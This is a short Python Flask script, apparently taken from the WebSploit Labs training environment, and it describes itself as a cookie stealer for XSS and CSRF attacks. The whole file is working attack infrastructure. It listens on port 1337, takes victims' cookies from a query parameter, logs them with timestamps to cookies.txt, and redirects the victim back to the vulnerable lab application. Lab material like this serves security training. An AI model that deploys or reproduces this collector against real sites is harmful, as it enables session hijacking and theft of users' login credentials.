#!/usr/bin/env python3
# This is a fairly basic Flask app / script to steal cookies 
# It can be used as a cookie-stealer for XSS and CSRF attacks
# This is available by default in WebSploit Labs (websploit.org)
# Make sure that you have flask, requests, and redirect installed
# pip3 install flask, requests, redirect

from flask import Flask, request, redirect
from datetime import datetime

# Creating the instance for the Flask app
app = Flask(__name__)

#The following is the root directory of our web app
@app.route('/')

#Let's now create a function to steal the cookie and write it to a file "cookies.txt"
def cookie():

    cookie = request.args.get('c')
    f = open("cookies.txt","a")
    f.write(str(cookie) + ' ' + str(datetime.now()) + '\n')
    f.close()

    # redirecting the user back to the vulnerable application
    # change the URL to whatever application you are leveraging
    return redirect("http://10.6.6.22")

# you can change the port below to whatever you want to listen it
if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=1337)
